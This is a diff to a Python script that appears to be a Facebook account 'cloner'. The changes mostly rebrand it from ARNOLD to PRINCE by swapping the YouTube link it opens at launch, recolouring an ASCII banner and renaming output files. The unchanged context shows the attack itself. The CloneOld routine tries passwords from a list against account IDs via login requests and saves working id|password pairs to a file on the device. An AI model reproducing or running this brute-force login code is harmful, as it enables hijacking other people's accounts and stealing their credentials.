@@ -80,7 +80,7 @@ except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()
 
 import random
 
-os.system('xdg-open https://youtube.com/@yeitechmonto?si=KuFvD1d932SY-U6G')
+os.system('xdg-open https://youtube.com/@technical.r.d?si=Oh39mZm_4sxIQ-7d')
 
 
 
@@ -95,23 +95,23 @@ class OLD_CLONER:
         os.system("clear")
                                                                                                                                                                                                                                                 
         print("\033[1;32m PPPPPPPPPPPPPPPPP   RRRRRRRRRRRRRRRRR   IIIIIIIIIINNNNNNNN        NNNNNNNN        CCCCCCCCCCCCCEEEEEEEEEEEEEEEEEEEEEE  ")
-        print("\033[1;32m P::::::::::::::::P  R::::::::::::::::R  I::::::::IN:::::::N       N::::::N     CCC::::::::::::CE::::::::::::::::::::E  ")
-        print("\033[1;32mP::::::PPPPPP:::::P R::::::RRRRRR:::::R I::::::::IN::::::::N      N::::::N   CC:::::::::::::::CE::::::::::::::::::::E  ")
-        print("\033[1;32mPP:::::P     P:::::PRR:::::R     R:::::RII::::::IIN:::::::::N     N::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEEE::::E  ")
-        print("\033[1;32m  P::::P     P:::::P  R::::R     R:::::R  I::::I  N::::::::::N    N::::::N C:::::C       CCCCCC  E:::::E       EEEEEE  ")
-        print("\033[1;32m  P::::P     P:::::P  R::::R     R:::::R  I::::I  N:::::::::::N   N::::::NC:::::C                E:::::E  ")             
-        print("\033[1;32m P::::PPPPPP:::::P   R::::RRRRRR:::::R   I::::I  N:::::::N::::N  N::::::NC:::::C                E::::::EEEEEEEEEE  ")   
-        print("\033[1;32m P:::::::::::::PP    R:::::::::::::RR    I::::I  N::::::N N::::N N::::::NC:::::C                E:::::::::::::::E  ")   
-        print("\033[1;32m P::::PPPPPPPPP      R::::RRRRRR:::::R   I::::I  N::::::N  N::::N:::::::NC:::::C                E:::::::::::::::E  ")   
+        print("\033[1;33m P::::::::::::::::P  R::::::::::::::::R  I::::::::IN:::::::N       N::::::N     CCC::::::::::::CE::::::::::::::::::::E  ")
+        print("\033[1;34mP::::::PPPPPP:::::P R::::::RRRRRR:::::R I::::::::IN::::::::N      N::::::N   CC:::::::::::::::CE::::::::::::::::::::E  ")
+        print("\033[1;35mPP:::::P     P:::::PRR:::::R     R:::::RII::::::IIN:::::::::N     N::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEEE::::E  ")
+        print("\033[1;36m  P::::P     P:::::P  R::::R     R:::::R  I::::I  N::::::::::N    N::::::N C:::::C       CCCCCC  E:::::E       EEEEEE  ")
+        print("\033[1;37m  P::::P     P:::::P  R::::R     R:::::R  I::::I  N:::::::::::N   N::::::NC:::::C                E:::::E  ")             
+        print("\033[1;38m P::::PPPPPP:::::P   R::::RRRRRR:::::R   I::::I  N:::::::N::::N  N::::::NC:::::C                E::::::EEEEEEEEEE  ")   
+        print("\033[1;39m P:::::::::::::PP    R:::::::::::::RR    I::::I  N::::::N N::::N N::::::NC:::::C                E:::::::::::::::E  ")   
+        print("\033[1;31m P::::PPPPPPPPP      R::::RRRRRR:::::R   I::::I  N::::::N  N::::N:::::::NC:::::C                E:::::::::::::::E  ")   
         print("\033[1;32m P::::P              R::::R     R:::::R  I::::I  N::::::N   N:::::::::::NC:::::C                E::::::EEEEEEEEEE  ")   
-        print("\033[1;32mP::::P              R::::R     R:::::R  I::::I  N::::::N    N::::::::::NC:::::C                E:::::E  ")             
-        print("\033[1;32mP::::P              R::::R     R:::::R  I::::I  N::::::N     N:::::::::N C:::::C       CCCCCC  E:::::E       EEEEEE  ")
-        print("\033[1;32mPP::::::PP          RR:::::R     R:::::RII::::::IIN::::::N      N::::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEE:::::E  ")
-        print("\033[1;32mP::::::::P          R::::::R     R:::::RI::::::::IN::::::N       N:::::::N   CC:::::::::::::::CE::::::::::::::::::::E  ")
-        print("\033[1;32mP::::::::P          R::::::R     R:::::RI::::::::IN::::::N        N::::::N     CCC::::::::::::CE::::::::::::::::::::E  ")
-        print("\033[1;32mPPPPPPPPPP          RRRRRRRR     RRRRRRRIIIIIIIIIINNNNNNNN         NNNNNNN        CCCCCCCCCCCCCEEEEEEEEEEEEEEEEEEEEEE  ")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+        print("\033[1;33mP::::P              R::::R     R:::::R  I::::I  N::::::N    N::::::::::NC:::::C                E:::::E  ")             
+        print("\033[1;34mP::::P              R::::R     R:::::R  I::::I  N::::::N     N:::::::::N C:::::C       CCCCCC  E:::::E       EEEEEE  ")
+        print("\033[1;35mPP::::::PP          RR:::::R     R:::::RII::::::IIN::::::N      N::::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEE:::::E  ")
+        print("\033[1;36mP::::::::P          R::::::R     R:::::RI::::::::IN::::::N       N:::::::N   CC:::::::::::::::CE::::::::::::::::::::E  ")
+        print("\033[1;37mP::::::::P          R::::::R     R:::::RI::::::::IN::::::N        N::::::N     CCC::::::::::::CE::::::::::::::::::::E  ")
+        print("\033[1;38mPPPPPPPPPP          RRRRRRRR     RRRRRRRIIIIIIIIIINNNNNNNN         NNNNNNN        CCCCCCCCCCCCCEEEEEEEEEEEEEEEEEEEEEE  ")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
         print("\033[1;37m------------------------------------------------")
-        print("\033[1;33m[+]\033[1;35mOWNER  : PRINCE MEGHWANSI")
+        print("\033[1;33m[+]\033[1;35mOWNER   : PRINCE MEGHWANSI")
         print("\033[1;33m[+]\033[1;35mVERSION : OLD CRACK")
         print("\033[1;33m[+]\033[1;35mVERSION : 0")
         print("\033[1;37m------------------------------------------------")
@@ -952,7 +952,7 @@ class OLD_CLONER:
     
     def CloneOld(self,ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f"\r\r\x1b[m [ARNOLD-XD] {self.loop}|OK:{len(self.oks)}")
+        sys.stdout.write(f"\r\r\x1b[m [PRINCE-XD] {self.loop}|OK:{len(self.oks)}")
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -999,11 +999,11 @@ class OLD_CLONER:
                 response = requests.post(url,data=data,headers=head,verify=True).json()
                 if "access_token" in response:
                     print(f"\r\r\x1b[38;5;46mARNOLD-OK • {ids} • {pas}")
-                    open("/sdcard/ARNOLD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    open("/sdcard/PRINCE-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.oks.append(ids)
                     break
                 elif "www.facebook.com" in response["error"]["message"]:
-                    print(f"\r\r\x1b[38;5;46mARNOLD-OK • {ids} • {pas}")                      
+                    print(f"\r\r\x1b[38;5;46mPRINCE-OK • {ids} • {pas}")                      
                     open("/sdcard/ARNOLD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.cps.append(ids)
                     break
